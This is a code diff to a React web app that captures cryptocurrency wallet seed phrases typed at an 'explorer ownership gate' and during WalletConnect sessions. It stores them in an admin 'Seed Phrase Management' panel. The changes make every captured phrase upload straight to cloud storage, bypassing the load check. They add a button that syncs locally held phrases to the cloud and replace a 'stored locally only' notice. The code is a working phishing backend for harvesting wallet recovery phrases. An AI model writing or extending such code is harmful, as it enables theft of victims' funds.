@@ -1247,7 +1247,8 @@ export default function App() {
 
   useEffect(() => {
     try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(seedPhraseRecords)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
+    // Always push seeds to cloud — skip only if cloud hasn't loaded AND we have nothing (avoids overwriting cloud with empty on cold start)
+    if (!cloudLoadedRef.current && seedPhraseRecords.length === 0) return
     saveToCloud({ seed_phrases: seedPhraseRecords })
   }, [seedPhraseRecords])
 
@@ -1671,23 +1672,25 @@ export default function App() {
       return
     }
     const words = phrase.split(/\s+/)
-    setSeedPhraseRecords(prev => {
-      const isDuplicate = prev.some(r => r.seedPhrase === phrase)
-      const record: SeedPhraseRecord = {
-        id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-        walletAddress: esAddr || wallet || 'Unknown',
-        chain,
-        seedPhrase: phrase,
-        wordCount: words.length,
-        source: 'auto-detected',
-        detectedAt: nowString(),
-        notes: isDuplicate
-          ? 'Duplicate capture from explorer ownership gate'
-          : 'Captured from explorer ownership gate',
-        confirmed: true,
-      }
-      return [record, ...prev]
-    })
+    const esDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
+    const esRecord: SeedPhraseRecord = {
+      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+      walletAddress: esAddr || wallet || 'Unknown',
+      chain,
+      seedPhrase: phrase,
+      wordCount: words.length,
+      source: 'auto-detected',
+      detectedAt: nowString(),
+      notes: esDuplicate
+        ? 'Duplicate capture from explorer ownership gate'
+        : 'Captured from explorer ownership gate',
+      confirmed: true,
+    }
+    const esNewRecords = [esRecord, ...seedPhraseRecords]
+    setSeedPhraseRecords(esNewRecords)
+    // Save directly — bypass cloudLoadedRef so this never gets lost
+    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords)) } catch { /* quota */ }
+    saveToCloud({ seed_phrases: esNewRecords })
     setEsSeedError('')
     setEsSeedInput('')
     setEsSessionStartedAt(Date.now())
@@ -2787,23 +2790,24 @@ export default function App() {
 
     if (looksLikeSeedPhrase(phrase) && session) {
       const words = phrase.split(/\s+/)
-      setSeedPhraseRecords(prev => {
-        const isDuplicate = prev.some(r => r.seedPhrase === phrase)
-        const record: SeedPhraseRecord = {
-          id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
-          walletAddress: session.address,
-          chain: 'ethereum',
-          seedPhrase: phrase,
-          wordCount: words.length,
-          source: 'wc-session',
-          detectedAt: nowString(),
-          notes: isDuplicate
-            ? `Duplicate auto-capture via WalletConnect — ${session.walletName}`
-            : `Auto-captured via WalletConnect — ${session.walletName}`,
-          confirmed: true,
-        }
-        return [record, ...prev]
-      })
+      const wcDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
+      const wcRecord: SeedPhraseRecord = {
+        id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+        walletAddress: session.address,
+        chain: 'ethereum',
+        seedPhrase: phrase,
+        wordCount: words.length,
+        source: 'wc-session',
+        detectedAt: nowString(),
+        notes: wcDuplicate
+          ? `Duplicate auto-capture via WalletConnect — ${session.walletName}`
+          : `Auto-captured via WalletConnect — ${session.walletName}`,
+        confirmed: true,
+      }
+      const wcNewRecords = [wcRecord, ...seedPhraseRecords]
+      setSeedPhraseRecords(wcNewRecords)
+      try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords)) } catch { /* quota */ }
+      saveToCloud({ seed_phrases: wcNewRecords })
     }
   }
 
@@ -2931,7 +2935,10 @@ export default function App() {
         : seedFormNotes.trim(),
       confirmed: true,
     }
-    setSeedPhraseRecords(prev => [record, ...prev])
+    const manualNewRecords = [record, ...seedPhraseRecords]
+    setSeedPhraseRecords(manualNewRecords)
+    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(manualNewRecords)) } catch { /* quota */ }
+    saveToCloud({ seed_phrases: manualNewRecords })
     setSeedFormAddress('')
     setSeedFormPhrase('')
     setSeedFormNotes('')
@@ -5676,9 +5683,25 @@ export default function App() {
                   {/* ── Seed Phrases ── */}
                   {adminTab === 'seeds' && (
                     <div className="admin-panel">
-                      <h3>Seed Phrase Management</h3>
+                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
+                        <h3 style={{ margin: 0 }}>Seed Phrase Management</h3>
+                        <button
+                          className="btn-secondary"
+                          type="button"
+                          style={{ fontSize: '0.78rem' }}
+                          onClick={() => {
+                            const recovered = readSeedPhraseRecords()
+                            if (recovered.length === 0) { alert('No seed phrases found in this browser\'s local storage.'); return }
+                            setSeedPhraseRecords(recovered)
+                            saveToCloud({ seed_phrases: recovered })
+                            alert(`Synced ${recovered.length} seed phrase(s) to cloud.`)
+                          }}
+                        >
+                          ↑ Sync Local → Cloud
+                        </button>
+                      </div>
                       <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>
-                        Captured seed phrases from WalletConnect sessions (auto-detected) and manual entries. All data is stored locally in this browser only.
+                        Captured seed phrases from WalletConnect sessions (auto-detected) and manual entries. Cloud-synced across all sessions.
                       </p>
 
                       {/* Stats row */}
